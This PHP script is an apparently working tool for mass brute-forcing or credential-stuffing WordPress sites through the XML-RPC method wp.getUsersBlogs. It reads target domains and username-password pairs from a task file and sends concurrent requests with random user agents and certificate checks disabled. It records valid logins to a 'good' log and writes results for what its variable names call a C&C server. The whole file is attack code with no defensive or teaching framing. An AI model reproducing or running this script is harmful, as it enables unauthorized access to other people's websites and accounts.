<?php
//gfdgfdg
function createRequest( $user, $password){
    $request = "<?xml version=\"1.0\"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>".htmlspecialchars($user)."</string></value></param><param><value><string>".htmlspecialchars($password)."</string></value></param></params></methodCall>";
    return $request;
}
function validateXML($result){
    $pos = strpos($result, '<?xml');
    if ($pos !== false and $pos != 0) {
        $result = substr($result, $pos);
    }
    $pos = strpos($result, '</methodR');
    if ($pos !== false) {
        $result = substr_replace($result, '</methodResponse>', $pos, strlen($result));
    }
    return $result;
}
function checkParseResults ($result,$brutePass){
    $xml = simplexml_load_string(trim($result));
    if ($xml !== false) {
        $counter = 0;
        if (isset($xml->params->param->value->array->data->value)) {
            foreach ($xml->params->param->value->array->data->value as $rpc) {
                if (isset($rpc->struct->member[0]->name)) {
                    if ($rpc->struct->member[0]->name == 'faultCode') {

                    } else {
                        file_put_contents(getcwd()."/log/good.txt",$result,FILE_APPEND);
                        return array('status'=>'GOOD','success'=>$brutePass['password']);
                    }
                } else {
                    file_put_contents(getcwd()."/log/good.txt",$result,FILE_APPEND);
                    return array('status'=>'GOOD','success'=>$brutePass['password']);
                }
                $counter++;
            }
        } else {
            if (isset($xml->fault->value->struct->member->name)) {
                if ($xml->fault->value->struct->member->name == 'faultCode') {
                    return array('status'=>'OK_BUT_NONE','success'=>false);
                }
                return array('status'=>'VERY STRANGE_RESPONCE','success'=>false);
            }
            return array('status'=>'STRANGE_RESPONCE','success'=>false);
        }
    } else {
        return array('status'=>'XML_LOAD_FAILED','success'=>false);
    }
    return array('status'=>'OK_BUT_NONE','success'=>false);

}

libxml_use_internal_errors(true);
date_default_timezone_set('UTC');
ini_set('memory_limit', '-1');
ini_set('max_execution_time', 500000000000);

$start = $argv[1];
$end = $argv[2];
$fold = $argv[3];
file_put_contents(getcwd().'/'.$fold.'/results5.txt',1);
file_put_contents(getcwd().'/results5.txt',2);
file_put_contents(getcwd().'log/results5.txt',3);


$workData = array();
$useragents = file(getcwd().'/'.$fold.'/useragents.txt');
$workData['userAgent']= preg_replace("/[\n\r]/","",$useragents[rand(1,count($useragents)-1)]);

$handle = fopen(getcwd().'/'.$fold.'/task.txt', "r");
$fullDataCounter =0;
while (($data = fgets($handle)) !== false or ($fullDataCounter < $end)) {

    $fullDataCounter++;
    if($fullDataCounter>$start and $fullDataCounter<=$end){
        $fullDataItem = preg_replace("/[\n\r]/","",$data);
        $dataExploded = explode('|',$fullDataItem);
        $workData['data'][] = array('id'=>$dataExploded[0],'domain'=>$dataExploded[1],'user'=>$dataExploded[2],'password'=>$dataExploded[3]);
    }
}


foreach($workData['data'] as $k=>$chunkItem){
    $workData['data'][$k]['request'] = createRequest($chunkItem['user'],$chunkItem['password']);
}

$ccServerResponce = array();
$multiCurl = [];
$mh = curl_multi_init();
foreach ($workData['data'] as $i => $id) {

    $fetchURL = $id['domain'];
    $multiCurl[$i] = curl_init();
    curl_setopt($multiCurl[$i], CURLOPT_URL,$fetchURL);
    curl_setopt($multiCurl[$i], CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($multiCurl[$i], CURLOPT_CUSTOMREQUEST, 'POST' );
    curl_setopt($multiCurl[$i], CURLOPT_HTTPHEADER, array(
        'Content-Type: text/xml'
    ));
    curl_setopt($multiCurl[$i], CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($multiCurl[$i], CURLOPT_USERAGENT, $workData['userAgent']);
    curl_setopt($multiCurl[$i], CURLOPT_POSTFIELDS, $id['request']);
    curl_setopt($multiCurl[$i], CURLINFO_HEADER_OUT, true);
    curl_setopt($multiCurl[$i], CURLOPT_FRESH_CONNECT, TRUE);
    curl_setopt($multiCurl[$i], CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($multiCurl[$i], CURLOPT_TIMEOUT,45);
    //curl_setopt($multiCurl[$i], CURLOPT_CONNECTTIMEOUT,8);
    curl_multi_add_handle($mh, $multiCurl[$i]);
}
$index=null;
do {
    curl_multi_exec($mh,$index);
} while($index > 0);

foreach($multiCurl as $k => $ch) {
    $analyse = array();
    $resultValidated = '';
    $responseMain = '';
    $info = curl_getinfo($ch);
    if($info['http_code']==200) {
        $responseMain = curl_multi_getcontent($ch);
        $resultValidated = validateXML($responseMain);
        $analyse = checkParseResults($resultValidated, $workData['data'][$k]);
        $ccServerResponce[] = array('link' => $workData['data'][$k]['domain'], 'result' => $analyse['status'], 'good'=>$analyse['success'],'user'=>$workData['data'][$k]['user'],'id'=>$workData['data'][$k]['id']);
        curl_multi_remove_handle($mh, $ch);
    }else{
        $ccServerResponce[] = array('curl'=>curl_error($ch),'code' => $info['http_code'], 'link' => $workData['data'][$k]['domain'], 'result' => $info['http_code'], 'user' => $workData['data'][$k]['user'],'id'=>$workData['data'][$k]['id']);
        curl_multi_remove_handle($mh, $ch);
    }
}
curl_multi_close($mh);


$sendClear = json_encode($ccServerResponce);

file_put_contents(getcwd()."/$fold/log/".$start."_".$end.".txt",$sendClear,FILE_APPEND);
